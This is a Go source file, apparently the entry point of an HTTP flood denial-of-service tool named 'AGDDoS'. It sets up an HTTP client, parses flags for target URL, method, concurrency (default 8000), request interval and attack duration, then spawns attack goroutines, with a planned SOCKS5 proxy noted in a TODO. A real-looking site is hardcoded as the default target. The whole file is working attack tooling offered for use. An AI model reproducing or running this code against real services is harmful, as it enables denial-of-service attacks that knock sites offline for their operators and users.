package main

import (
	"context"
	"flag"
	"log"
	"net"
	"net/http"
	"os"
	"time"
)

// X args
var (
	timestamp = "unknown"
	version   = "unknown"
)
var (
	Method              string
	TargetUrl           string
	IntervalMillisecond int
	ConcurrencyCount    int
	DurationMinute      int

	//TODO：Socks5 Proxy
	DDosHttpClient = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
				dialer := net.Dialer{
					Timeout:   30 * time.Second, // 超时时间
					KeepAlive: 60 * time.Second, // KeepAlive时间
				}
				return dialer.Dial(network, addr)
			},
		},
	}
)

// Main Function
func main() {
	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"
	printWelcome()
	// Parse Flags / 解析命令行参数
	printVersion := flag.Bool("v", false, "Print version")
	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/PUT/HEAD/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行攻击的频率(ms)")
	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
	flag.Parse()

	if *printVersion {
		printVer()
		os.Exit(0)
	}
	if TargetUrl == defaultTargetUrl {
		log.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
		return
	}
	go func() {
		for i := 0; i < ConcurrencyCount; i++ {
			go DoAttacking(i)
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
	os.Exit(0) // Exit with code 0
}
